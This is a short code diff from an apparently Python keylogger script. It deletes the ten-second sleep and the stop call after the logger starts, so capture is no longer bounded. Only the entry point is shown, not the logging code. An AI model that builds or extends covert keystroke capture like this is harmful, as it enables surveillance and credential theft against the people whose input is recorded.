@@ -52,7 +52,6 @@ class KeyLogger:
 if __name__ == '__main__':
     r = KeyLogger()
     r.start_listen()
-    time.sleep(10)
-    r.stop_listen()
+
 
 
